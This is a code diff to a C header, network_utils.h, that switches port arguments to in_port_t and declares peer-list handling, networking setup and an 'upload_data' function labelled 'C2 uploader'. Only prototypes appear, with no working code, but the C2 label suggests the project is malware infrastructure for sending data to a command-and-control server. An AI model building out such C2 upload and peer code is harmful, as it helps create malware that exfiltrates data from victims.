@@ -1,9 +1,11 @@
 #ifndef NETWORK_UTILS_H
 #define NETWORK_UTILS_H
 
+#include <sys/socket.h>
 #include <netinet/in.h>
 
 #include "../include/system_utils.h"
+#include "../include/types.h"
 
 typedef struct _peer_list peer_list;
 
@@ -14,7 +16,7 @@ typedef struct _peer_list peer_list;
  * 
  * Returns - OK or ERROR
  */
-int stop_server(char *ip, int port);
+int stop_server(char *ip, in_port_t port);
 
 /**
  * UDP Server
@@ -25,10 +27,14 @@ int stop_server(char *ip, int port);
  *
  * Returns - The data or NULL in case of error
 */
-int start_server(int port);
+int start_server(in_port_t port);
 
-void get_ip(char *ip_addr, int port);
-int add_peer(peer_list *peers, const struct sockaddr_in *other);
+int init_networking();
+int clean_networking();
+int get_ip(const struct sockaddr_in *socket, char *ip);
+int handle_comm(peer_list *peers, const struct sockaddr_in *other, const byte *data);
+int add_peer(peer_list *peers, const struct sockaddr_in *other, const byte *data);
+int get_peer(const peer_list *peers, const char *other_ip, size_t *index);
 
 /**
  * C2 uploader
@@ -40,6 +46,6 @@ int add_peer(peer_list *peers, const struct sockaddr_in *other);
  *
  * Returns - The number of bytes sent or -1 in case of error with errno set appropriately
 */
-size_t upload_data(char *ip_addr, int port, unsigned char *data, size_t len);
+size_t upload_data(char *ip_addr, in_port_t port, unsigned char *data, size_t len);
 
 #endif
